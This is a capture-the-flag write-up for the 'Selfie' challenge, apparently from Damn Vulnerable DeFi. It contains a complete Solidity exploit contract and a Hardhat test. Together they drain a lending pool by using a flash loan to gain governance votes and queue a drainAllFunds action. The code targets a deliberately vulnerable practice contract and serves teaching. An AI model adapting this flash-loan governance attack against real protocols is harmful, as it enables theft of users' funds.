# Challenge #6 - Selfie
A new cool lending pool has launched! It's now offering flash loans of DVT tokens.

Wow, and it even includes a really fancy governance mechanism to control it.

What could go wrong, right ?

You start with no DVT tokens in balance, and the pool has 1.5 million. Your objective: take them all.

## Exploit 
In this challenge, our goal is to execute the ``drainAllFunds()`` from the SelfiePool. In order to do 
that, we'll have to execute that from the governance contract. Looking at the Governance contract, we 
can execute an action as long as we have enough votes which we can get through the flashloan and that way 
we can drain all the funds.  

```sol
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "hardhat/console.sol";

interface ISelfie {
	function flashLoan(uint256 borrowAmount) external;
}

interface IGovernance {
	function queueAction(address receiver, bytes calldata data, uint256 weiAmount) external returns (uint256);
	function executeAction(uint256 actionId) external payable;
}

interface IToken {
	function getBalanceAtLastSnapshot(address account) external view returns (uint256);
	function balanceOf(address account) external view returns (uint256);
	function snapshot() external returns (uint256);
	function transfer(address to, uint256 amount) external returns (bool);
}

contract Exploit_Selfie {
	ISelfie pool;
	IGovernance governance;
	IToken token;
	address attacker;

	function exec(address _pool, address _governance, address _token) external {
		pool = ISelfie(_pool);
		governance = IGovernance(_governance);
		token = IToken(_token);
		attacker = msg.sender;
		pool.flashLoan(1500000 ether);
	}

	function receiveTokens(address _token , uint amount) external payable {
		bytes memory data = abi.encodeWithSignature('drainAllFunds(address)', attacker);
		token.snapshot();
		governance.queueAction(
			msg.sender,
			data,
			0 wei
		);
		token.transfer(msg.sender, amount);
	}
}
```
Execution: 
```js
    it('Exploit', async function () {
        /** CODE YOUR EXPLOIT HERE */
		await this.exploit.exec(this.pool.address, this.governance.address, this.token.address);
		await ethers.provider.send("evm_increaseTime", [2 * 24 * 60 * 60]); // 2 days
		await this.governance.executeAction(1, {value: ethers.utils.parseEther('1')});
    });
```

